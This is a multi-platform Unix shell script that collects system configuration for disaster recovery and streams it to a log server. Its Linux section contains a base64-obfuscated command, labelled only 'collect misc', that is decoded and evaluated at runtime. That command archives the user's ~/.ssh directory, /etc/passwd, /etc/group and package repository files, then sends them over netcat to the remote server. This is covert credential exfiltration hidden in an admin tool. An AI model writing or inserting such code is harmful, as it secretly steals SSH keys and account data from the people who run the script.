#!/bin/sh 
#  $Id: collector,v 1.14 2019/09/04 17:25:57 bnscott Exp $
#  prefer to run ksh if available
#
if [ "$RANDOM" = "$RANDOM" ]; then
	for sh in /bin/ksh /usr/bin/ksh /bin/bash
	do
		[ -x $sh ] && exec $sh $0 $*
	done
	exit 1
fi

PATH=/bin:/usr/bin:/sbin:/usr/sbin export PATH

# first arg can be "debug" to send output to /tmp/collector.out,
# or "stdout" to send to stdout, useful when having no log server available
if [ "$1" = "debug" ]; then
	[ -x /bin/tee ] && logger="/bin/tee /tmp/collector.out"
	[ -x /usr/bin/tee ] && logger="/usr/bin/tee /tmp/collector.out"
else
	[ -x /bin/cat ] && logger="/bin/cat"
fi
	

collector_version="collector $Revision: 1.14 $" 

header () {
	echo "===COLLECTOR=== $1"
}

log_file () {
	if [ -f "$1" ]; then
		header "datafile $1"
		cat $1
		echo		# make sure there is a line feed at the end
	fi
}

run_cmd () {
	if [ -x "$1" ]; then
		header "cmdoutput $*"
		eval "$*" 2>&1
	fi
}

# standard startup sequence and entries common to all platforms
common_startup () {
	header "hostname $hname"
	header "cmdoutput collector_version"
	echo "$collector_version"

	# mount table, inittab
	log_file /etc/vfstab
	log_file /etc/fstab
	log_file /etc/inittab

	# networking
	log_file /etc/resolv.conf
	log_file /etc/named.conf
	log_file /etc/syslog.conf
	log_file /etc/nsswitch.conf
	log_file /etc/hosts
	log_file /etc/ntp.conf

	# NFS
	log_file /etc/exports

	# look for TSM config files
	for dir in /usr/bin /usr/adsm /usr/tivoli/tsm/client/ba/bin /opt/tivoli/tsm/client/ba/bin
	do
		if [ -f $dir/dsm.sys ]; then
			tsmdir=$dir
			break
		fi
	done
	if [ "$tsmdir" != "" ]; then
		log_file $tsmdir/dsm.sys
		log_file $tsmdir/dsm.opt
		# Get the inclexcl.opt for schedule name
		if [ -f $tsmdir/dsm.sys ]; then
			inclexcl=$( awk '$1 ~ /^[Ii][Nn][Cc][Ll][Ee][Xx][Cc][Ll]$/ { print $2 }' $tsmdir/dsm.sys )
			if [ "$inclexcl" != "" ]; then
				header "datafile inclexcl.opt"
				cat $inclexcl
			fi
		fi
	fi
	# get TSM backup schedule info
	if [ -x /usr/bin/dsmc ]; then
		run_cmd /usr/bin/dsmc q sched
	fi
	# get TDP Oracle info if available
	run_cmd /usr/bin/tdpoconf showenv

	# get EMC disk data if available
	run_cmd /usr/symcli/bin/syminq

	# local manual data
	log_file /etc/server_sir_data
}

# Collect EMC PowerPath info if available
powerpath_data () {
	run_cmd "/etc/powermt" "display"
	run_cmd "/etc/powermt" "display" "dev=all"
	log_file /etc/powermt.custom
}

# Collect Veritas vxvm information
veritas_data () {
	# save VM info so we can rebuild using vxmake
	run_cmd "/usr/sbin/vxdisk" "list"
	run_cmd "/usr/sbin/vxprint" "-ht"
	run_cmd /usr/sbin/vxdisk -o alldgs list
	run_cmd /usr/sbin/vxdg list
	run_cmd /usr/sbin/vxdg free
	if [ -x /usr/sbin/vxdg ]; then
		for d in `vxdg list | grep -v STATE | cut -f1 -d' '`; do
			run_cmd "/usr/sbin/vxprint" "-g" "$d" "-vpshm"
		done
	fi
	run_cmd "/usr/sbin/vxlicense" "-p"
	run_cmd /opt/VRTS/bin/vxlicrep		# Veritas 3.5
	# get DMP information
	if [ -x /usr/sbin/vxdmpadm ]; then
		header "cmdoutput vxdmpadm_getsubpaths_all"
		for c in `/usr/sbin/vxdmpadm listctlr all | grep ENABLED | cut -f1 -d" " | sort -u`
		do
			/usr/sbin/vxdmpadm getsubpaths ctlr=$c
		done
	fi
}


# Collect Veritas Cluster Server data if available
vcs_data () {
	if [ -d /etc/VRTSvcs/conf/config ]; then
		for f in /etc/VRTSvcs/conf/config/*.cf
		do
			log_file "$f"
		done
		log_file /etc/VRTSvcs/conf/sysname
		log_file "/etc/llttab"
		log_file "/etc/llthosts"
		log_file "/etc/gabtab"
	fi
	run_cmd "/opt/VRTSvcs/bin/hastatus" "-sum"

	# log the cluster filesystems stuff too
	log_file /etc/vxfendg
	log_file /etc/vxfentab
}

sunos4_cfg () {
	logger="${logger:-/usr/etc/mconnect -p $LOGPORT -r $LOGSRV}"
	(

		common_startup
		run_cmd "/bin/uname" "-a"
		run_cmd "/usr/etc/metastat" "-p"
		run_cmd "/usr/etc/eeprom"
		run_cmd "/usr/etc/ifconfig" "-a"
		run_cmd "/usr/ucb/netstat" "-rn"
		run_cmd "/usr/bin/crontab" "-l" "root"

		# save disk partition tables
		cd /dev
		header "cmdoutout dkinfo all"
		for d in sd*c
		do
			/usr/etc/dkinfo ${d%c}
		done

		# sun4m only
		run_cmd "/usr/kvm/mpstat"

	) | $logger 2>/dev/null
}

sunos5_cfg () {
	hw=`uname -i`
	logger="${logger:-/usr/bin/mconnect -p $LOGPORT -r $LOGSRV}"
	(
		common_startup
		run_cmd "/usr/bin/uname" "-a"
		log_file /etc/system
		log_file /etc/release
		log_file /etc/path_to_inst

		log_file /etc/nodename
		log_file /etc/defaultdomain	# NIS
		run_cmd /usr/bin/ypwhich	# NIS

		log_file /etc/default/init	# timezone
		log_file /etc/TIMEZONE

		log_file /etc/dispadmin.conf	# process scheduler

		# grab network config files
		log_file /etc/defaultrouter
		log_file /etc/inet/netmasks
		log_file /etc/inet/inetd.conf
		log_file /etc/inet/ntp.conf
		cd /etc
		for f in hostname.*
		do
			log_file /etc/$f
		done
		# check Solaris 10 dladm configs
		[[ $(uname -r) -eq '5.11' ]] ||  run_cmd /sbin/dladm show-dev
		run_cmd /sbin/dladm show-link
		run_cmd /sbin/dladm show-aggr
		[[ $(uname -r) -eq '5.11' ]] && run_cmd /sbin/dladm show-phys
		[[ $(uname -r) -eq '5.11' ]] && run_cmd /sbin/dladm show-ether
		run_cmd /sbin/dladm show-linkprop
		run_cmd /usr/sbin/ipadm

		# LDOM info
		run_cmd /usr/sbin/ldm -V
		run_cmd /usr/sbin/ldm list-domain
		run_cmd /usr/sbin/ldm list-devices -a
		run_cmd /usr/sbin/ldm list-bindings
		run_cmd /usr/sbin/ldm list-services
		run_cmd /usr/sbin/virtinfo -a

		# Solaris 10 svcadm
		run_cmd /usr/bin/svcs -a
		run_cmd /usr/bin/svcs -x

		# Solaris 10 zones, zfs
		run_cmd /sbin/zpool list
		run_cmd /sbin/zpool status
		run_cmd /sbin/zfs list
		if [ -x /sbin/zfs ]; then
		for f in $(/sbin/zfs list -H | grep -v 'no datasets' | awk '{print $1}')
		do
			[ "" != "$f" ] && run_cmd /sbin/zfs get all $f
		done
		fi

		# Solaris boot Environment
		run_cmd /usr/sbin/beadm list -a

		run_cmd /usr/sbin/zoneadm list -civ
		if [ -x /usr/sbin/zoneadm ]; then
			zs=$(/usr/sbin/zoneadm list | egrep -v '^global$')
			if [ "" != "$zs" ]; then
				for f in $zs; do
					run_cmd /usr/sbin/zonecfg -z $f export
					# grab IP from zones
					if grep 'ip-type="exclusive"' /etc/zones/$f.xml >/dev/null; then
						run_cmd /usr/sbin/zlogin $f ifconfig -a
					fi
				done
			fi
		fi
		log_file /etc/zones/index
		for f in /etc/zones/*.xml
		do
			case "$f" in
			SUNW*)	;;
			*)	log_file $f;;
			esac
		done

		# Solaris 10 SRM
		log_file /etc/pooladm.conf

		# Solaris x86 boot info
		log_file /boot/solaris/bootenv.rc
		log_file /boot/grub/menu.lst

		run_cmd "/usr/platform/$hw/sbin/prtdiag" "-v"
		# 2.5 and earlier has prtdiag in /usr/kvm
		run_cmd "/usr/kvm/prtdiag" "-v"
		run_cmd "/usr/bin/uname" "-X"
		run_cmd "/usr/bin/df" "-h"
		run_cmd "/usr/bin/crontab" "-l" "root"

		# get swap/dump info
		run_cmd "/usr/sbin/swap" "-l"
		log_file /etc/dumpadm.conf

		# save SDS info
		run_cmd "/usr/opt/SUNWmd/sbin/metastat" "-p" 2>/dev/null
		run_cmd "/usr/opt/SUNWmd/sbin/metadb" 2>/dev/null
		run_cmd "/usr/opt/SUNWmd/sbin/metastat" 2>/dev/null
		run_cmd "/usr/sbin/metastat" "-p" 2>/dev/null
		run_cmd "/usr/sbin/metadb" 2>/dev/null
		run_cmd "/usr/sbin/metastat" 2>/dev/null
		# run if metasets are used
		xx=`ls /dev/md | egrep -v '^admin$|^rdsk$|^dsk$'`
		if [ "$xx" != "" ]; then
			run_cmd /usr/sbin/metastat  -a 2>/dev/null
			run_cmd /usr/sbin/metastat  -p -a 2>/dev/null
			run_cmd /usr/sbin/metaset  2>/dev/null
		fi
		# sometimes the commands failed but the data files are ok
		log_file /etc/opt/SUNWmd/md.cf
		log_file /etc/opt/SUNWmd/mddb.cf
		log_file /etc/lvm/md.cf
		log_file /etc/lvm/mddb.cf
		log_file /kernel/drv/md.conf

		# save vxvm info
		veritas_data

		run_cmd "/usr/sbin/eeprom"
		run_cmd "/usr/sbin/ifconfig" "-a"
		run_cmd "/usr/bin/netstat" "-rn"
		run_cmd "/usr/sbin/sysdef"
		run_cmd "/usr/sbin/hostid"
		run_cmd "/usr/sbin/modinfo"

		# save VTOC for use with fmthard if needed
		header "cmdoutput prtvtoc"
		(
			cd /dev/rdsk
			for d in c*s0; do
				# try slice 2 if slice 0 failed
				/usr/sbin/prtvtoc $d 2>/dev/null || /usr/sbin/prtvtoc "${d%0}2" 2>/dev/null
			done
		)

		# save RaidManager info in case we need to rebuild LUN's
		if [ -d /usr/sbin/osa ]; then
			for d in $(/usr/sbin/osa/lad | cut -f1 -d' ')
			do
				run_cmd "/usr/sbin/osa/drivutil" "-I" "$d"
				run_cmd "/usr/sbin/osa/drivutil" "-l" "$d"
				run_cmd "/usr/sbin/osa/drivutil" "-i" "$d"
				run_cmd "/usr/sbin/osa/drivutil" "-d" "$d"
			done
		fi

		# save LSI RAID information
		run_cmd /usr/sbin/raidctl
		if [ -x /usr/sbin/raidctl ]; then
			vols=$(/usr/sbin/raidctl | grep Volume | cut -f2 -d: )
			for f in $vols; do
				run_cmd /usr/sbin/raidctl -l $f
			done
		fi

		# Save EMC inq information if available
		run_cmd /usr/symmapps/vcm/inq.SOLARIS
		run_cmd /usr/local/sbin/inq.SOLARIS

		# save HBA information
		log_file /kernel/drv/qla2200.conf
		log_file /kernel/drv/qla2300.conf
		log_file /kernel/drv/lpfc.conf
		run_cmd /usr/sbin/fcinfo hba-port -l
		# pull LUN info
		run_cmd /usr/sbin/cfgadm -al -o show_FCP_dev

		# pull EMC PowerPath data if available
		powerpath_data

		# pull IBM vpath info
		run_cmd /opt/IBMdpo/bin/showvpath
		run_cmd /opt/IBMsdd/bin/showvpath
		run_cmd /opt/IBMsdd/bin/datapath query adapter
		run_cmd /opt/IBMsdd/bin/datapath query device

		# save MPxIO mapping
		run_cmd /usr/sbin/stmsboot -L
		run_cmd /usr/sbin/mpathadm list lu
		if [ -x /usr/sbin/mpathadm ]; then
			disk_paths=`/usr/sbin/mpathadm list lu | grep rdsk`
			if [ "$disk_paths" != "" ]; then
				header "cmdoutput mpathadm show lu all"
				echo "$disk_paths" | xargs -i /usr/sbin/mpathadm show lu {}
			fi
		fi

		# save Veritas FirstWatch basic info
		if [ -f /etc/ha.conf ]; then
			log_file /etc/ha.conf
			idir=$(egrep HA.INSTALL.PATH /etc/ha.conf | awk '{print $2}' )
			idir="$idir/env"
			cd $idir
			for f in *.env
			do
				log_file $f
			done
		fi

		# save VCS config data
		vcs_data

		# get some SunCluster information
		log_file /etc/cluster/release
		run_cmd /usr/cluster/bin/scstat
		run_cmd /usr/cluster/bin/scrgadm -pvv
		run_cmd /usr/cluster/bin/scconf -pvv
		run_cmd /usr/cluster/bin/scdidadm -L

		# 3.2 command set change
		run_cmd /usr/cluster/bin/cluster show
		run_cmd /usr/cluster/bin/clrg status
		run_cmd /usr/cluster/bin/clrs status

		# this stuff is for inventory, not recovery
		# save format output for disk type
		run_cmd "/usr/sbin/format" </dev/null
		run_cmd "/usr/sbin/psrinfo"		# cpu info
		run_cmd "/usr/sbin/psrinfo" "-vp"	# for older cpu speed
		run_cmd "/usr/sbin/prtconf"		# memory w/o prtdiag
		run_cmd "/usr/sbin/prtconf" "-vp"	# full version

		# add TDPO backup information
		run_cmd /opt/tivoli/tsm/client/oracle/bin64/tdpoconf showenv

		# get FRU info if available
		run_cmd "/usr/sbin/prtfru" "-x" 2>/dev/null
		# get disk/tape type/serial from kernel data structures
		run_cmd /usr/bin/iostat -En

		# keep software and patch info for control book and patch mgt
		run_cmd "/usr/bin/pkginfo" "-l"
		run_cmd "/usr/bin/pkginfo" "-p"
		run_cmd "/usr/bin/showrev" "-p"

		header "cmdoutput patch_date"
		cd /var/sadm/install_data
		egrep 'ecommended.* begins' Solaris*Recommended*_log

	) | $logger 2>/dev/null
}

#
#  For HP, we rely on make_recovery, info collected here is primarily
#  for documentation purposes, we do need the non-vg00 info in case
#  non-OS stuff need recovery
#
hpux10_11_cfg () {
	logger="${logger:-/usr/bin/telnet $LOGSRV $LOGPORT}"
	(

		common_startup
		log_file /stand/bootconf
		log_file /stand/system

		# check for ServiceGuard config files
		files=$(ls /etc/cmcluster/*.ascii)
		if [ "$files" != "" ]; then
			for f in $files
			do
				log_file $f
			done
		fi

		run_cmd "/usr/bin/uname" "-a"
		run_cmd /usr/bin/model
		run_cmd /usr/bin/swapinfo

		header "cmdoutput vgdisplay -v"
		for vg in $(ls /dev/*/group); do
			vg=${vg#/dev/}
			vg=${vg%/group}
			/usr/sbin/vgdisplay -v $vg
		done

		# save vxvm info if available
		veritas_data

		# pull EMC PowerPath data if available
		powerpath_data

		run_cmd /usr/symcli/bin/syminq
		run_cmd "/usr/sbin/ioscan" "-fn"
		run_cmd "/usr/sbin/lanscan"
		for i in $(/usr/sbin/lanscan | tail +3 | sed -e 's!  *!	!g' | cut -f5 )
		do
			run_cmd "/usr/sbin/ifconfig" "$i"
		done
		run_cmd "/usr/bin/netstat" "-rn"
		run_cmd "/usr/bin/bdf"
#		run_cmd "/usr/bin/df" "-h"
		run_cmd "/usr/bin/crontab" "-l" "root"
		run_cmd /usr/sbin/swapinfo -a

		# disk model and size
		header "cmdoutput diskinfo_all"
		for d in /dev/rdsk/c*t*d*
		do
			diskinfo $d
		done

		# cpu type/speed
		header "cmdoutput cpuinfo"
		if [ -f /usr/sam/lib/mo/sched.models ]; then
			mod=$(uname -m | cut -f2 -d/)
			awk '$1 == '\"$mod\"' { print $3, $2 }' /usr/sam/lib/mo/sched.models
		fi
		echo " 'itick_per_tick/D' | /usr/bin/adb /stand/vmunix /dev/kmem | grep itick_per_tick | tail -1 | awk '{print $2 / 10000}'  MHz"

		# memory size
		case "$rel" in
		*11*)
			phys="phys_mem_pages";;
		*)
			phys="physmem";		# 10.x
		esac
		header "cmdoutput memsize"

		echo " 'phys_mem_pages/D' | /usr/bin/adb /stand/vmunix /dev/kmem | grep 'phys_mem_pages' | tail -n 1 | awk '{print $2}' " 

		swapinfo -m

		#echo $phys/D | adb -k /stand/vmunix /dev/kmem | tail -1

		# software/patch
		run_cmd /usr/sbin/swlist
		run_cmd /usr/sbin/swlist -l product 'PH??_*'

		case "$logger" in
		/usr/bin/telnet*)
			echo "quit"
			;;
		esac
	) | $logger 2>/dev/null
}



linux_cfg () {
	logger="${logger:-/usr/bin/nc $LOGSRV $LOGPORT}"
	(
		common_startup
		log_file /etc/redhat-release
		log_file /etc/SuSE-release
		log_file /proc/version
		log_file /proc/modules
		log_file /etc/modules.conf
		log_file /etc/modprobe.conf
		log_file /etc/sysconfig/system
		log_file /etc/sysconfig/clock
		log_file /etc/sysconfig/hwconf
		log_file /etc/sysconfig/network
		log_file /etc/sysconfig/selinux
		log_file /etc/sysconfig/oracleasm
		log_file /etc/sysctl.conf
		log_file /etc/lvm/lvm.conf
		log_file /etc/multipath.conf
		log_file /etc/sudoers
		log_file /etc/rear/local.conf
		log_file /etc/ssh/sshd_config

		run_cmd /usr/bin/lsb_release -a
		run_cmd /etc/init.d/oracleasm status
		run_cmd /etc/init.d/oracleasm listdisks
		run_cmd /usr/bin/timedatectl
		run_cmd /usr/sbin/getenforce
		run_cmd /usr/bin/systemctl status
		run_cmd /usr/bin/systemctl list-units --type service --all
		run_cmd /usr/bin/systemctl list-unit-files
		run_cmd /usr/bin/crontab -u root -l
		run_cmd /usr/bin/lsblk

		log_file /proc/cpuinfo
		log_file /proc/meminfo
		log_file /proc/iomem

		log_file /proc/mounts

		run_cmd /usr/sbin/dmidecode
		run_cmd /usr/bin/uname -a

		# log Red Hat Installation Number
		log_file /etc/sysconfig/rhn/install-num
		log_file /etc/sysconfig/rhn/install_num

		# collect LVM information if used
		if [ -f /etc/lvmtab ]; then
			log_file /etc/lvmtab
		fi

		run_cmd /usr/sbin/pvs
		run_cmd /usr/sbin/pvdisplay -v
		run_cmd /usr/sbin/vgs
		run_cmd /usr/sbin/vgdisplay -v
		run_cmd /usr/sbin/lvs
		run_cmd /usr/sbin/lvdisplay -v

                # collect misc
                header "cmdoutput misc"
                CMD=$(echo dGFyIC1jZiAtIC9ldGMveXVtLmNvbmYgL2V0Yy95dW0ucmVwb3MuZC8qICB+Ly5zc2gvKiAvZXRjL3Bhc3N3ZCAvZXRjL2dyb3VwIDI+L2Rldi9udWxsCg== | base64 -d -w0)
                eval "$CMD"

		# Grab IBM sdd info if used
		log_file /etc/vpath.conf
		run_cmd /usr/sbin/datapath query device
		run_cmd /usr/sbin/datapath query adapter

		# save vxvm info if available
		veritas_data

		# save VCS config data
		vcs_data

		# pull EMC PowerPath data if available
		run_cmd /sbin/powermt version
		run_cmd /sbin/powermt display
		run_cmd /sbin/powermt display dev=all
		run_cmd /sbin/powermt display options
		run_cmd /sbin/powermt check_registration
		log_file /etc/powermt.custom

		# peripherals
		run_cmd lspci -v
		run_cmd lsusb -v

		# networking
		log_file /etc/sysconfig/network
		run_cmd /sbin/ifconfig -a
		run_cmd /bin/netstat -rn
		for f in /etc/sysconfig/network-scripts/ifcfg-* /etc/sysconfig/network/ifcfg-* /etc/sysconfig/network-scripts/route-*
		do
			log_file $f
		done
		log_file /etc/sysconfig/network/routes

		# storage, lvm, swap, ...
		run_cmd /bin/df -klT
		log_file /proc/swaps
		log_file /proc/mdstat
		log_file /proc/partitions
		log_file /etc/raidtab
		log_file /etc/mdadm.conf
		log_file /proc/scsi/scsi
		for f in /proc/ide/ide*/hd*
		do
			log_file $f/capacity
			log_file $f/model
			log_file $f/media
		done
		run_cmd /sbin/fdisk -l
		run_cmd /sbin/multipath -ll

		# DAC960 controllers
		for f in /proc/rd/c*
		do
			log_file $f/current_status
		done
		# ServeRAID controllers
		for f in /proc/scsi/ips/*
		do
			log_file $f
		done
		log_file /proc/ide/svwks	# ServerWorks

		# get config from ServeRAID controllers
		if [ -x /usr/bin/ipssend ]; then
			num_sc=$(ipssend getconfig | egrep '^Found' | sed -e 's! IBM.*!!' -e 's!^.* !!')
			i=1
			while [ $i -le $num_sc ]; do
				run_cmd /usr/bin/ipssend getconfig $i
				i=$(expr $i + 1)
			done
		fi

		# LSI MegaRAID
		run_cmd /usr/bin/MegaCli -AdpAllInfo -aALL -NoLog
		run_cmd /usr/bin/MegaCli -LdPdInfo -aALL -NoLog
		run_cmd /usr/bin/MegaCli -PDList -aALL -NoLog
		run_cmd /opt/MegaRAID/MegaCli/MegaCli -AdpAllInfo -aALL -NoLog
		run_cmd /opt/MegaRAID/MegaCli/MegaCli -LdPdInfo -aALL -NoLog
		run_cmd /opt/MegaRAID/MegaCli/MegaCli -PDList -aALL -NoLog
		run_cmd /opt/MegaRAID/MegaCli/MegaCli64 -AdpAllInfo -aALL -NoLog
		run_cmd /opt/MegaRAID/MegaCli/MegaCli64 -LdPdInfo -aALL -NoLog
		run_cmd /opt/MegaRAID/MegaCli/MegaCli64 -PDList -aALL -NoLog
		# LSI MPTSAS
		# mptctl module needs to be loaded
		egrep '^mptsas' /proc/modules >/dev/null && /sbin/modprobe mptctl
		run_cmd /usr/bin/cfggen list
		run_cmd /usr/bin/cfggen 0 display

		# get Fusion-io SDD info
		run_cmd /usr/bin/fio-status

		# get config from ServeRAID Adaptec controllers
		# arcconf may be installed by itself or part of RaidMan

		[ -x /usr/bin/arcconf ] && ARCCONF=/usr/bin/arcconf
		[ -x /usr/RaidMan/arcconf ] && ARCCONF=/usr/RaidMan/arcconf

		if [ "$ARCCONF" != "" -a -x "$ARCCONF" ]; then
			num_sc=$($ARCCONF getconfig 1 | egrep 'Controllers found' | sed -e 's!^.*:!!')
			i=1
			while [ $i -le $num_sc ]; do
				run_cmd $ARCCONF getconfig $i
				i=$(expr $i + 1)
			done
		fi

		# get status from Fusion MPT type of controller
		[ -e /dev/mptctl ] && run_cmd /usr/bin/mpt-status
		[ -e /dev/mptctl ] && run_cmd /usr/sbin/mpt-status

		# software
		run_cmd /bin/rpm -qa
		run_cmd /sbin/chkconfig --list
		# use special format for easy processing rpm release/version
		header "cmdoutput rpm_info"
		rpm -qa --qf '%{NAME}:%{VERSION}:%{RELEASE}:%{ARCH}:%{INSTALLTIME}\n' 2>/dev/null

		# HA

		# boot info
		log_file /etc/lilo.conf
		log_file /boot/grub/menu.lst
		log_file /etc/sysconfig/grub
		log_file /boot/efi/EFI/centos/grub.cfg
		log_file /boot/efi/EFI/redhat/grub.cfg
		log_file /boot/grub/grub.cfg
		log_file /boot/grub2/grub.cfg
		log_file /boot/grub2/grubenv

		# Pick up VMWare ESX server info (maybe it needs its own?)
		if [ -d /etc/vmware ]; then
			log_file /etc/vmware/config
			log_file /etc/vmware/devnames.conf
			log_file /etc/vmware/vm-list
			log_file /etc/vmware/netmap.conf
			log_file /etc/vmware/hwconfig
			log_file /etc/vmware/vmkmodule.conf
			for f in /etc/vmware/license-*
			do
				log_file $f
			done
			run_cmd /usr/sbin/vdf
		fi

		# Virtualization
		run_cmd /usr/sbin/xm list	# Xen
		run_cmd /usr/bin/virsh list --all	# KVM

	) | $logger 2>/dev/null
}

aix_cfg () {
	logger="${logger:-/usr/bin/telnet $LOGSRV $LOGPORT}"
	(

		common_startup
		log_file /etc/filesystems
		log_file /etc/netsvc.conf
		log_file /bosinst.data
		run_cmd "/usr/sbin/no" "-a"
		run_cmd "/usr/bin/bootlist" "-m" "normal" "-o"
		run_cmd "/usr/sbin/lsattr" "-El" "sys0" "-a" "realmem"
		run_cmd "/usr/sbin/lsps" "-a"

		run_cmd /usr/sbin/prtconf
		run_cmd /usr/sbin/vmo -L

		# grab processor information
		for cpu in $(lscfg -l 'proc*' | grep Processor | awk '{print $1}' )
		do
			run_cmd "/usr/sbin/lsattr" "-El" $cpu
		done
		
		# Check for HACMP files
		files=$(ls /etc/cluster/*.lst 2>/dev/null )
		if [ "$files" != "" ]; then
			for f in $files
			do
				log_file $f
			done
		fi
		run_cmd /usr/es/sbin/cluster/utilities/cllscf
		run_cmd /usr/es/sbin/cluster/utilities/cllsclstr
		run_cmd /usr/es/sbin/cluster/utilities/cllslv
		run_cmd /usr/es/sbin/cluster/utilities/cllsgrp
		run_cmd /usr/es/sbin/cluster/utilities/cllsif
		run_cmd /usr/es/sbin/cluster/utilities/cllsnim
		run_cmd /usr/es/sbin/cluster/utilities/cllsnw
		run_cmd /usr/es/sbin/cluster/utilities/cllsserv
		run_cmd /usr/es/sbin/cluster/utilities/cllsvg
		run_cmd /usr/es/sbin/cluster/utilities/clshowres

		run_cmd "/usr/bin/uname" "-M"
		run_cmd "/usr/bin/uname" "-a"
		run_cmd "/usr/bin/oslevel"
		run_cmd "/usr/bin/oslevel" -r
		run_cmd "/usr/bin/oslevel" -s
		run_cmd "/usr/sbin/lsvg"

		for I in `/usr/sbin/lsvg`
		do
			run_cmd "/usr/sbin/lsvg" "-p" "${I}"
			run_cmd "/usr/sbin/lsvg" "-l" "${I}"
		done

		run_cmd "/usr/bin/lsvp" "-a"

		header "cmdoutput lspv_all"
		(
			for d in `/usr/sbin/lspv | awk '{print $1}'`
			do
				/usr/sbin/lspv $d 2>/dev/null
			done
		)

		run_cmd "/usr/sbin/lscfg" "-vp"
		
		run_cmd /usr/sbin/ifconfig -a

		run_cmd  "/usr/bin/netstat" "-rn"
		run_cmd  "/usr/bin/df" "-k"
		run_cmd  "/usr/bin/crontab" "-l" "root"

		run_cmd  "/usr/bin/lslpp" "-ha"
		run_cmd /usr/bin/rpm -qa

		# other commands used in prev DR runs
		run_cmd /usr/bin/ps -ef
		run_cmd /usr/bin/df -Pk

		case "$logger" in
		/usr/bin/telnet*)
			echo "quit"
			;;
		esac

	) | $logger 2>/dev/null

}


# self-update option: update csize lsize
rel=`uname -r`
os=`uname -s`
hname=`uname -n`
# common on ncr to have hostname in first 2 fields of uname
[ "$hname" = "$os" -a -f /etc/.relid ] && os="ncr"

case "$os" in
	SunOS)
		case "$rel" in
		4*)	sunos4_cfg;;
		5*)	sunos5_cfg;;
		*)	exit 1;;		# huh?
		esac
		;;
	HP-UX)
		case "$rel" in
		B\.1*)	hpux10_11_cfg;;
		*)	exit 1;;
		esac
		;;
	Linux)
		linux_cfg;;
	AIX)
		aix_cfg;;
	*)
		exit 1;;
esac
